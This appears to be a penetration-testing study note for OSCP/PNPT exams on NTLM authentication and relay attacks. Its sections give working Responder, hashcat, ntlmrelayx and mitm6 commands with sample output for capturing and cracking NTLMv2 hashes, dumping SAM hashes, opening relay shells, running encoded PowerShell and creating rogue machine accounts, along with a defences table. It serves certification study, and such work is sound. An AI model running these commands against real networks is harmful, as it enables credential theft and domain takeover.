---
tags: [oscp-journey, spectre, stage-3, pnpt, active-directory, ntlm, relay, responder]
module: 3
cert-stage: pnpt
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 4 — Active Directory/04.2 — Initial Access"]
netgod-refs: []
---

# S3-02 — NTLM Authentication and Relay Attacks

## NTLM Hash Types — Understanding the Differences

Before attacking, you need to know exactly what you're dealing with. These are four distinct things that are all casually called "NTLM hashes" — they are NOT interchangeable.

| Name | Format | Where Found | Crackable? | Relayable? |
|------|--------|------------|-----------|-----------|
| **LM Hash** | `AAD3B435B51404EEAAD3B435B51404EE` | SAM dumps (pre-Vista) | Yes (fast) | No |
| **NT Hash** | `8846f7eaee8fb117ad06bdd830b7586c` | SAM, NTDS.dit | Yes (hashcat -m 1000) | Yes (PTH) |
| **NTLMv1** | `username::domain:challenge:response:response` | Network capture | Yes (fast) | Theoretically |
| **NTLMv2** | `username::domain:challenge:NTproofstr:blob` | Network capture (Responder) | Yes (slow, hashcat -m 5600) | **Yes — this is what you relay** |

**The critical distinction:**
- **NT hash** = the actual password hash stored in SAM/NTDS.dit → use for Pass-the-Hash
- **NTLMv2** = the full network authentication response captured by Responder → crack or relay

When people say "I captured an NTLM hash with Responder," they mean **NTLMv2**. When they say "dump NTLM hashes from SAM," they mean **NT hashes**.

---

## How NTLM Works — The Three-Step Challenge-Response

Understanding this is essential for understanding why relay attacks work.

```
Step 1 — NEGOTIATE:
Client → Server: "I want to authenticate as jsmith"

Step 2 — CHALLENGE:
Server → Client: "Prove it. Here's a random 8-byte nonce: 0x1234567890abcdef"

Step 3 — AUTHENTICATE:
Client → Server: {
    Username: jsmith
    Domain: EUROSTOP
    NTProofStr: HMAC-MD5(NT_hash, server_challenge + client_challenge)
    Blob: client_challenge + timestamp + other_data
}
```

The server sends the challenge and the client's response to the DC, which verifies by:
1. Retrieving jsmith's NT hash from NTDS.dit
2. Computing what the response SHOULD be
3. Comparing — if it matches, authentication succeeds

**Why relay attacks work:**
The server never validates that the client is who they say they are — it just checks that the math is right. If you intercept the client's authentication response and forward it to a different server, that server accepts it as proof that you're jsmith. You never needed jsmith's password.

---

## LLMNR/NBT-NS Poisoning — How It Works

### What LLMNR and NBT-NS Are

When a Windows machine tries to resolve a hostname that DNS can't resolve, it falls back to:

**LLMNR (Link-Local Multicast Name Resolution):** Broadcasts a query to the local network segment: "Hey, does anyone know the IP for `\\fileserver`?"

**NBT-NS (NetBIOS Name Service):** An older fallback — broadcasts "Does anyone know `FILESERVER`?"

Both protocols accept responses from ANY machine on the network. There is no authentication of the responder. This is the vulnerability.

### The Attack — Responder

When a Windows machine broadcasts "Who knows `\\fileserver`?", Responder (running on your Kali) answers: "That's me! I'm `\\fileserver`. Connect here."

The Windows machine then tries to authenticate to you, sending its NTLMv2 hash in the process.

```
Windows Client:    "Who knows \\nonexistentshare?" (LLMNR broadcast)
Responder (Kali):  "That's me! Connect to 192.168.0.50"
Windows Client:    [Connects and sends NTLMv2 hash of the current user]
Kali:              [Captures and logs the hash]
```

**When this happens naturally:**
- User types `\\fileserver` in Windows Explorer — typo, server offline, or shares that no longer exist
- Applications configured to connect to network shares that don't exist
- Group Policy referencing UNC paths that no longer resolve
- Print spooler connecting to offline printers

### Running Responder

```bash
# Identify your interface:
ip a    # Note the interface on the same network as targets (eth0, tun0, etc.)

# Run Responder:
sudo responder -I eth0 -dwv

# Flags:
# -I eth0    = listen on this interface
# -d         = enable DHCP poisoning
# -w         = start WPAD rogue server
# -v         = verbose output

# For internal network assessment (most common):
sudo responder -I eth0 -dwPv
# -P = ProxyAuth (capture proxy auth credentials too)
```

**What Responder listens for:**
- LLMNR (UDP 5355)
- NBT-NS (UDP 137)
- MDNS (UDP 5353)
- HTTP (TCP 80) — for WPAD/proxy auth
- SMB (TCP 445)
- HTTPS (TCP 443)
- LDAP (TCP 389)
- And more — it's a comprehensive credential capture platform

**Reading Responder output:**
```
[*] [LLMNR] Poisoned answer sent to 192.168.0.100 for name NONEXISTENT
[SMB] NTLMv2-SSP Client   : 192.168.0.100
[SMB] NTLMv2-SSP Username : EUROSTOP\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::EUROSTOP:1234567890abcdef:AAAABBBBCCCCDDDD...
```

**Captured hashes are stored at:**
```bash
ls /usr/share/responder/logs/
# SMB-NTLMv2-SSP-192.168.0.100.txt
# HTTP-NTLMv2-192.168.0.101.txt
```

### Cracking Captured NTLMv2 Hashes

```bash
# Copy hash to a file:
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.0.100.txt

# Crack with hashcat:
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# With john:
john ntlmv2_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked results:
hashcat -m 5600 ntlmv2_hashes.txt --show
```

**NTLMv2 cracking speed:**
- GPU: ~10–100 billion hashes/sec (fast)
- CPU only: ~50–500 million hashes/sec (slow but usable)
- rockyou.txt covers most common passwords in seconds on GPU

### When LLMNR Poisoning Won't Work

- LLMNR is disabled via Group Policy (increasingly common in hardened environments)
- NBT-NS is disabled
- You're on a network segment with no mistyped UNC paths
- Modern Windows Defender Network Protection blocks LLMNR responses

**Solution:** Use SMB Relay instead — no cracking required.

---

## SMB Relay Attack — Why It's Better Than Cracking

### The Concept

Instead of capturing the NTLMv2 hash and cracking it, you **relay it in real time** to another machine. The victim authenticates to you, and you immediately forward their authentication to a target server — the target server believes the authentication came from the victim.

**You never need to know the password.** You just need to forward the authentication.

```
Victim (jsmith) ──NTLM Auth──→ Responder/ntlmrelayx (Kali) ──relays──→ Target Server
                                                                              ↓
                                                              "jsmith authenticated — access granted"
                                                              [dumps SAM or gives shell]
```

### Prerequisites for SMB Relay

**Requirement 1 — SMB signing must be DISABLED on the target.**

SMB signing cryptographically signs SMB packets so the receiver can verify they haven't been tampered with. If signing is required, a relay attack fails because your relayed packets don't have valid signatures.

**Check SMB signing status:**
```bash
# Nmap:
nmap --script smb2-security-mode -p445 TARGET
# Output:
# Message signing enabled but not required ← VULNERABLE to relay
# Message signing enabled and required     ← NOT vulnerable

# CrackMapExec:
crackmapexec smb 192.168.0.0/24 --gen-relay-list relay_targets.txt
# This automatically finds machines where signing is NOT required
# and saves their IPs to relay_targets.txt
```

**Important:** Domain Controllers ALWAYS have SMB signing required. You cannot relay to a DC directly. Target workstations and member servers.

**Requirement 2 — The relayed user must have local admin on the target.**

The relay gives you the victim's authentication. If jsmith is a local admin on the target machine, you get admin access. If not, you get limited access.

Domain Admins are local admins on all domain machines — relaying a DA's hash anywhere gets you admin. Standard users may not have local admin anywhere useful.

### Executing the SMB Relay Attack — Step by Step

**Step 1 — Find targets with SMB signing not required:**
```bash
crackmapexec smb 192.168.0.0/24 --gen-relay-list relay_targets.txt
cat relay_targets.txt    # IPs of machines where signing is not required
```

**Step 2 — Modify Responder configuration to NOT serve SMB and HTTP:**
```bash
sudo nano /usr/share/responder/Responder.conf

# Change:
SMB = On   →   SMB = Off
HTTP = On  →   HTTP = Off

# Why: ntlmrelayx will handle SMB — if Responder serves it too, there's a conflict
# Responder still poisons LLMNR/NBT-NS to make victims connect to you
# ntlmrelayx receives the connection and relays it
```

**Step 3 — Start ntlmrelayx:**
```bash
# Basic relay — dumps SAM hashes from target:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Interactive shell (instead of SAM dump):
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# Creates a local SMB shell you connect to

# Execute command on relay:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami > C:\Temp\out.txt"

# SOCKS proxy (access victim's SMB through SOCKS after relay):
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
# Then: proxychains smbclient //TARGET/share -U user
```

**Step 4 — Start Responder (poisoner, not handler):**
```bash
sudo responder -I eth0 -dwv
```

**Step 5 — Wait for a victim to trigger LLMNR/NBT-NS:**
```
[*] [LLMNR] Poisoned answer sent to 192.168.0.100 for name MISSING_SERVER
```

**ntlmrelayx output when relay succeeds:**
```
[*] Authenticating against smb://192.168.0.50 as EUROSTOP\Administrator SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xABCD...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jsmith:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

You now have NT hashes for all local accounts — use them for Pass-the-Hash.

**Interactive shell mode:**
```bash
# Start ntlmrelayx with -i:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i

# When relay succeeds:
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000

# Connect to the interactive shell:
nc 127.0.0.1 11000
# You now have an SMB shell as the relayed user
Type help for list of commands
# shares, use SHARE, ls, get file, put file, etc.
```

---

## IPv6 Attack — mitm6 + ntlmrelayx

### Why IPv6 Works Even in IPv4-Only Networks

Modern Windows machines prefer IPv6 over IPv4. Even if an organisation doesn't intentionally use IPv6, Windows machines still listen for DHCPv6 broadcasts and will configure themselves with an IPv6 DNS server if one offers itself.

**The attack:**
1. `mitm6` sends fake DHCPv6 responses, assigning itself as the IPv6 DNS server for victims
2. Victims start using your machine as their DNS server for IPv6 queries
3. When victims try to authenticate to anything using your fake DNS (like WPAD), they authenticate to you
4. You relay those authentications to LDAP on the DC

```
mitm6 → DHCPv6 response → "I'm your IPv6 DNS server"
Victim → DNS query → mitm6 → "The address for WPAD is [our IP]"
Victim → WPAD auth → ntlmrelayx → relays to LDAP on DC
ntlmrelayx → Creates new domain user or modifies ACLs
```

### Execution

**Step 1 — Start mitm6:**
```bash
sudo mitm6 -d domain.local
# -d = target domain (only responds to queries from this domain)
```

**Step 2 — Start ntlmrelayx targeting LDAP on the DC:**
```bash
# Create a new domain user when relay succeeds:
impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh fakewpad.domain.local -l /tmp/lootdir

# Flags:
# -6        = IPv6 support
# -t ldaps  = target LDAP over TLS on DC
# -wh       = WPAD hostname to serve (victims browse to this for proxy config)
# -l        = output directory for LDAP dump

# Alternative — add machine account (useful for RBCD attack):
impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh fakewpad.domain.local --add-computer EVILPC Password123!
```

**What happens when successful:**
```
[*] Authenticating against ldaps://DC_IP as EUROSTOP\DC01$ SUCCEED
[*] Enumerating domain users...
[*] Domain dump saved to /tmp/lootdir/
# OR:
[*] Adding new machine account EVILPC$ with password Password123!
[*] EVILPC$ can now be used for RBCD attacks
```

**Reading the LDAP dump:**
```bash
ls /tmp/lootdir/
# domain_computers.json
# domain_groups.json
# domain_users.json
# domain_policy.json

# Parse with:
cat /tmp/lootdir/domain_users.json | python3 -m json.tool | grep -A5 "userAccountControl"
```

---

## NTLM Relay to ADCS (ESC8)

If Active Directory Certificate Services (ADCS) is deployed with the Web Enrollment interface (`/certsrv`), you can relay NTLM authentication to obtain a certificate for the victim — which can then be used to get their NT hash or a Kerberos TGT.

This is covered in depth in S6-01 (CPTS note). Introduced here for awareness.

```bash
# Relay to ADCS HTTP enrollment:
impacket-ntlmrelayx -t http://ADCS_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Then use the certificate to get NT hash:
# certipy auth -pfx cert.pfx -dc-ip DC_IP
```

---

## Defences Against These Attacks — Know What You're Bypassing

Understanding defences helps you:
1. Identify which attacks will work in a given environment
2. Write better remediation recommendations in your report
3. Understand why the attack failed

| Attack | Defence |
|--------|---------|
| LLMNR Poisoning | Disable LLMNR via GPO: Computer Config → Admin Templates → Network → DNS Client → Turn off multicast name resolution = Enabled |
| NBT-NS Poisoning | Disable NetBIOS via DHCP option 001 or NIC properties |
| SMB Relay | Enable SMB signing on all machines: `Set-SmbServerConfiguration -RequireSecuritySignature $true` |
| IPv6/mitm6 | Block DHCPv6 traffic and IPv6 at switch level; disable IPv6 if not used |
| Relay to LDAP | Enable LDAP signing and channel binding |

---

## OSCP and PNPT Exam Relevance

**PNPT (TCM Security):**
LLMNR poisoning and SMB relay are core PNPT content. The 5-day exam will almost certainly have an internal network where Responder captures credentials or where relay gives you initial access.

**OSCP:**
These techniques are valid on OSCP. There is no restriction on Responder or ntlmrelayx — they're not Metasploit modules. Use them freely.

**Time budget on exam:**
- Responder: Run it immediately on any internal network, let it run in the background
- Relay check: 2 minutes to run `crackmapexec smb SUBNET --gen-relay-list`
- If relay list has entries: set up relay attack, takes 5 minutes
- If Responder captures hash: try to crack while continuing other enumeration

---

## Quick Reference

```bash
# Run Responder (capture NTLMv2 hashes):
sudo responder -I eth0 -dwv

# Responder logs location:
ls /usr/share/responder/logs/

# Crack captured NTLMv2:
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Find SMB relay targets:
crackmapexec smb 192.168.0.0/24 --gen-relay-list relay_targets.txt

# Disable Responder SMB/HTTP before relay:
sudo nano /usr/share/responder/Responder.conf  # Set SMB=Off, HTTP=Off

# SMB relay — dump SAM:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# SMB relay — interactive shell:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
nc 127.0.0.1 11000    # Connect to interactive shell

# SMB relay — execute command:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "powershell -enc BASE64"

# IPv6 relay to LDAP:
sudo mitm6 -d domain.local
impacket-ntlmrelayx -6 -t ldaps://DC_IP -wh fakewpad.domain.local -l /tmp/loot

# Check SMB signing:
nmap --script smb2-security-mode -p445 TARGET
crackmapexec smb TARGET --gen-relay-list /dev/stdout
```

---

## Common Mistakes

> [!warning] Relay attack mistakes
> 1. **Leaving Responder SMB/HTTP On during relay.** ntlmrelayx won't receive the connection if Responder is already answering on port 445/80. Always set `SMB = Off` and `HTTP = Off` in Responder.conf before running a relay attack.
> 2. **Trying to relay to a DC.** DCs require SMB signing. ntlmrelayx will fail silently. Generate your relay list with crackmapexec — it filters out DCs automatically.
> 3. **Not checking if the relayed user has local admin.** If the hash you relay belongs to a domain user without local admin on the target, you get limited access. Watch for `(Pwn3d!)` in CME output or `SUCCEED` in ntlmrelayx output.
> 4. **Running Responder on the wrong interface.** `-I tun0` on an OSCP VPN won't capture internal traffic. Use `-I eth0` (or whichever interface connects to the target network).
> 5. **Not waiting long enough.** LLMNR events happen when users mistype paths, open Explorer, or applications try to reconnect. Run Responder for at least 10–15 minutes before concluding no hashes are being generated.
> 6. **Forgetting to crack AND relay.** Run ntlmrelayx for relay AND separately crack any captured hashes in hashcat. Both attacks run simultaneously and either may succeed first.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Compromising Active Directory" | LLMNR poisoning and relay labs |
| TCM Security — PEH course AD section | Full Responder + relay demo |
| HTB — Monteverde | LDAP enumeration, credential reuse from LDAP dump |
| HTB — Resolute | DNS zone transfer → credentials → lateral movement |
| Set up a home lab | Windows Server 2019 DC + Windows 10 client — practice Responder capture |
| [[PHANTOM/MODULE 4 — Active Directory/04.2 — Initial Access]] | Full technical depth in PHANTOM vault |
